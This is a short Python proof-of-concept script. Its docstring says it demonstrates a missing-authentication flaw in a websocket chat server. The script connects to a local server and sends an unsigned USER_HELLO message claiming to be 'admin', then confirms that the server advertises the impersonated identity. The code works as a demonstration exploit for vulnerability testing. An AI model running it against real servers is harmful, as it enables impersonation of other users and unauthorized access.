"""
Proof of Concept: No Authentication Impersonation

This script demonstrates a vulnerability where the server allows user registration and
advertisement without proper authentication or verification, enabling an attacker to
impersonate any user (e.g., 'admin') by simply sending a USER_HELLO message.

In a secure system, user identities should be authenticated through cryptographic challenges,
registration protocols, or other means to prevent unauthorized impersonation.
"""

import asyncio
import json
import time

import websockets

from crypto import generate_rsa_keypair


def now(): return int(time.time() * 1000)


async def main(host="127.0.0.1", port=8080, user_id="admin"):
    uri = f"ws://{host}:{port}/ws"
    private_key_b64, public_key_b64 = generate_rsa_keypair()

    async with websockets.connect(uri) as ws:
        await ws.send(json.dumps({
            "type": "USER_HELLO", "from": user_id, "to": "server", "ts": now(),
            "payload": {"client": "poc", "pubkey": public_key_b64}, "sig": ""
        }))

        async for message in ws:
            data = json.loads(message)
            if data.get("type") == "USER_ADVERTISE" and data["payload"]["user_id"] == user_id:
                print(f"[OK] Impersonated {user_id} and sent USER_ADVERTISE without any auth.")
                break


if __name__ == "__main__":
    asyncio.run(main())
